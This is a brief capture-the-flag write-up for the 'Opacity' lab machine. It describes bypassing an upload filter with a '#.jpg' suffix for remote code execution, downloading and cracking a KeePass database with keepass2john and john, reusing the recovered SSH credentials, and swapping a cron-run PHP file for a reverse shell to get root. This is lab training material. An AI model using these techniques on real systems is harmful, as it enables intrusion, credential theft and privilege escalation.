# CTF Writeup: Opacity

---

- Step 1: Analyzing webpage source code, made basic enumeration methods nmap, gobuster, dirsearch, data package
analysis and ran sqlmap on it for potential injections, but didn't find anything.
- Step 2: After further inspection I realised that it blocks my pings, so I made nmap -Pn and I found out about
port 139 & 445
- Step 3: Apparently I had a connection bug, now I ran gobuster and went to the /cloud dir and found an file image upload (url) page. started a python3 server
on my local machine --> made python3 -m http.server 8000 --> went into file uploader and prompted --> http://machine_ip/Desktop/test.php#.jpg the "#.jpg" is
there to bypass the filters. --> gained rce as user www-data
- Step 4: couldn't retrieve user flag. --> went into opt/ dir and found keepass
database --> created python3 server on rce --> made wget http://target_ip/opt/dataset.kdbx to retrieve keepass database --> converted it into hash values
--> made keepass2john dataset.kdbx > dataset.hash so the stored values get converted
into hash values --> made john dataset.hash --wordlist=/usr/share/wordlists/rockyou.txt --> got password of database dataset:741852963
- Step 5: retrieved creds from database of sysadmin:Cl0udP4ss40p4city#8700
- Step 6: logged in with ssh & retrieved local.txt flag --> went into scripts dir and analyzed root "script" file now that I have access to view it. --> imports 
an script named backup.inc.php --> which sysadmin is the owner of --> can be deleted and replaced with revshell --> created a python server on my local machine
and made wget to get the revshell into the path --> named it backup.inc.php --> since this script gets executed similiar to an cronjob every couple of mins I created a listener and after some time I got root --> retrieved proof.txt flag

---

## Key Learnings

- Improved Privilege Escelation Knowledge --> KeepassXC database cracking
- Added new toolstack to my knowledge --> john for hash cracking & keepass2john to parse dataset value into hash values
- Slightly strengthened filter bypass knowledge
- Increased Source Code Research Skills
- Slightly Increased File Transfer Knowledge
